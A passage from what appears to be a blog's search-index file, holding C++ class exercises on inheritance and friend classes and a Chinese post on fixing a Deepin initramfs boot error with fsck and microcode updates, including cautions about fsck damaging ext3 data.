&nbsp; &nbsp; cout&lt;&lt;<span class="string">"sex: "</span>&lt;&lt;sex&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line"><span class="keyword">private</span> :</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> num;</span><br><span class="line">&nbsp; &nbsp; string name;</span><br><span class="line">&nbsp; &nbsp; <span class="type">char</span> sex;</span><br><span class="line">};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student1</span>:<span class="keyword">public</span> Student</span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">get_value1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">get_value</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;age&gt;&gt;addr;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"age: "</span>&lt;&lt;age&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"address: "</span>&lt;&lt;addr&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> age;</span><br><span class="line">&nbsp; &nbsp; string addr;</span><br><span class="line">};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student2</span>:<span class="keyword">private</span> Student</span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">get_value1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">get_value</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;age&gt;&gt;addr;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"age: "</span>&lt;&lt;age&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"address: "</span>&lt;&lt;addr&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> age;</span><br><span class="line">&nbsp; &nbsp; string addr;</span><br><span class="line">};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student3</span>:<span class="keyword">protected</span> Student</span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">get_value1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">get_value</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cin&gt;&gt;age&gt;&gt;addr;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">&nbsp; &nbsp; </span>{</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="built_in">display</span>();</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"age: "</span>&lt;&lt;age&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; cout&lt;&lt;<span class="string">"address: "</span>&lt;&lt;addr&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> age;</span><br><span class="line">&nbsp; &nbsp; string addr;</span><br><span class="line">};</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; Student1 stud1;</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">1.</span><span class="built_in">get_value1</span>();</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">1.</span><span class="built_in">display1</span>();</span><br><span class="line">&nbsp; &nbsp; Student2 stud2;</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">2.</span><span class="built_in">get_value1</span>();</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">2.</span><span class="built_in">display1</span>();</span><br><span class="line">&nbsp; &nbsp; Student3 stud3;</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">3.</span><span class="built_in">get_value1</span>();</span><br><span class="line">&nbsp; &nbsp; stud<span class="number">3.</span><span class="built_in">display1</span>();</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Date</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Time</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="built_in">Time</span>(<span class="type">int</span> h, <span class="type">int</span> m, <span class="type">int</span> s): <span class="built_in">hour</span>(h), <span class="built_in">minute</span>(m), <span class="built_in">sec</span>(s) {};</span><br><span class="line">&nbsp; &nbsp; <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">(Date &amp;)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> hour;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> minute;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> sec;</span><br><span class="line">};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Date</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">friend</span> Time;</span><br><span class="line">&nbsp; &nbsp; <span class="built_in">Date</span>(<span class="type">int</span> m, <span class="type">int</span> d, <span class="type">int</span> y): <span class="built_in">month</span>(m), <span class="built_in">day</span>(d), <span class="built_in">year</span>(y) {};</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> month;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> day;</span><br><span class="line">&nbsp; &nbsp; <span class="type">int</span> year;</span><br><span class="line">};</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Time::display</span><span class="params">(Date &amp;d)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;d.month&lt;&lt;<span class="string">"/"</span>&lt;&lt;d.day&lt;&lt;<span class="string">"/"</span>&lt;&lt;d.year&lt;&lt;endl;</span><br><span class="line">&nbsp; &nbsp; cout&lt;&lt;hour&lt;&lt;<span class="string">":"</span>&lt;&lt;minute&lt;&lt;<span class="string">":"</span>&lt;&lt;sec&lt;&lt;endl;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">&nbsp; &nbsp; <span class="function">Date <span class="title">d1</span><span class="params">(<span class="number">01</span>, <span class="number">01</span>, <span class="number">2019</span>)</span></span>;</span><br><span class="line">&nbsp; &nbsp; <span class="function">Time <span class="title">t1</span><span class="params">(<span class="number">15</span>, <span class="number">57</span>, <span class="number">56</span>)</span></span>;</span><br><span class="line">&nbsp; &nbsp; t<span class="number">1.</span><span class="built_in">display</span>(d1);</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> cpp </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Deepin开机遇见的 [Firmware Bug] initramfs问题</title>
      
      
      <link href="/cn/posts/44884/"/>
      
      
      <url>/cn/posts/44884/</url>
      
      
        
      <content type="html"><![CDATA[<p>[Firmware Bug]： TSC_DEADLINE disabled due to Errata; please update microcode to version: 0x25 (or later) </p><p>解决方法：首先输入exit 然后输入</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsck -y /dev/sd **</span><br></pre></td></tr></tbody></table></figure><p>这里依据出现的提示输入，例如</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsck -y /dev/sda</span><br></pre></td></tr></tbody></table></figure><p>然后再输入exit进入系统 顺便可以更新一下 输入：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install intel-microcode </span><br></pre></td></tr></tbody></table></figure><p>或者：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install amd64-ucode</span><br></pre></td></tr></tbody></table></figure><blockquote><p>功能说明：检查文件系统并尝试修复错误。<br> 语　　法：fsck [-aANPrRsTV][-t &lt;文件系统类型&gt;][文件系统…]<br> 补充说明：当文件系统发生错误四化，可用fsck指令尝试加以修复。<br> 注意：千万不能在运行的系统上面直接执行fsck，特别是RHEL6.0以下ext3的文件系统，否则100%损坏根文件系统，使用fsck -y /dev/sdb1 修复磁盘时，必须将sdb1分区umount掉<br> 参　　数：<br> -a 自动修复文件系统，不询问任何问题。<br> -A 依照/etc/fstab配置文件的内容，检查文件内所列的全部文件系统。<br> -N 不执行指令，仅列出实际执行会进行的动作。<br> -P 当搭配”-A”参数使用时，则会同时检查所有的文件系统。<br> -r 采用互动模式，在执行修复时询问问题，让用户得以确认并决定处理方式。<br> -R 当搭配”-A”参数使用时，则会略过/目录的文件系统不予检查。<br> -s 依序执行检查作业，而非同时执行。<br> -t&lt;文件系统类型&gt; 指定要检查的文件系统类型。<br> -T 执行fsck指令时，不显示标题信息。<br> -V 显示指令执行过程。<br> fdisk -l 查看设备号<br> 运行 fsck -y /dev/sdb1 修复磁盘 -y参数为自动确认修复<br> 这条命令也是用fsck修复磁盘是，常使用的命令</p><p>特别说明：在EXT3（实际上其他文件系统也类似）无法mount，或者提示fsck时，如果有重要数据，应该慎重对待，千万不可贸然执行”fsck -f  -y　“这样的自动修复功能。如果可能，先对故障区域做dd全镜像后再执行，或者以只读方式执行，并仔细看修复过程，如果提示大量inode错误、需要重建树、或大小不对等就不可再继续下去了。</p><h3 id="Linux-ext3-fsck一定要慎用"><a href="#Linux-ext3-fsck一定要慎用" class="headerlink" title="Linux ext3 fsck一定要慎用"></a>Linux ext3 fsck一定要慎用</h3><p>不管是哪种文件系统，其根本目的都是相同的：如何把文件存在系统给定的区域里，如何有效地管理文件的读与写。为实现这样的目的，驱动层需要完善、周密地应付附加在文件系统上的各种操作。这些操作通常不会是一条指令完成的，如果一个过程需要多条指令完成，在执行这些操作时，全部指令未完成的情况下产生中断，那这个文件系统便会出现一致性错误(或者叫连续性错误)。</p><p>为了保证尽可以少的出现一致性错误，现在主流的文件系统都会设计成日志型的。日志型文件系统的主要特点就是把一个操作的所有指令执行过程都另外缓冲下来，如果全部执行完成再清除日志标志，如果操作没有执行完成，可以在重新激活后通过日志回溯或继续完成。</p><p>EXT3的日志功能通过在EXT2的设计基础上增加一个特殊的文件(通常是８号节点文件)，在这个文件中记录文件系统的操作过程。但EXT系统文件系统本身在节点、间接索引块、目录节点方面没有冗余保护，所以当文件系统除日志外的其他结构并不一致，却又要通过fsck来进行修复，这种一致性有可能将原本正确的结构也错误化。(就像原来是1+2=3，现在错成了1+3=3，也许改完后变成了1+3=4，就完全没办法还原成最早的1+2=3)。</p><p>数据恢复领域经常会遇到这类情况：一次RAID出故障后，下次启动系统提示做fsck，但做完后，也无法mount分区或者mount  分区后数据全是错的。需要对这类情况进行数据修复的难度是很大的，从一个完整的结构(fsck后实际上从系统角度看已经是完整的了)再构建另一个完全不同的结构要比修正一个错误的结构更难以下手。其实这类情况，很多是因为RAID5有早离线的盘加入了两个逻辑磁盘组，导致所有的数据流是以新+旧的方式交错组成的，自然会有太多错误。这时候如果做fsck后，有可能数据都无法恢复了。</p><p>所以，在EXT3（实际上其他文件系统也类似）无法mount，或者提示fsck时，如果有重要数据，应该慎重对待，千万不可贸然执行”fsck  -f  -y　“这样的自动修复功能。如果可能，先对故障区域做dd全镜像后再执行，或者以只读方式执行，并仔细看修复过程，如果提示大量inode错误、需要重建树、或大小不对等就不可再继续下去了。</p></blockquote>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
        
      </tags>
      
      
    
    </entry>
  </search>
